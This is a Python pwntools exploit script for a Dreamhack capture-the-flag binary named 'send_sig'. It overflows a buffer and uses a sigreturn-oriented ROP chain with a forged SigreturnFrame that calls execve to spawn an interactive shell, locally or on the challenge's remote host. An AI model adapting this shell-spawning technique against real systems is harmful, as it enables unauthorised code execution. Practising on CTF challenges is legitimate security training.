#!/usr/bin/python3

from pwn import *

exe = ELF("./send_sig")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host8.dreamhack.games', 20059)
else:
    p = process([exe.path])
GDB()
pop_rax = 0x00000000004010ae
syscall = 0x00000000004010b0
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402000
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload = b'A' * 16
payload += p64(pop_rax) + p64(0xf)
payload += p64(syscall)
payload += bytes(frame)
sa(b'Signal:', payload)





p.interactive()

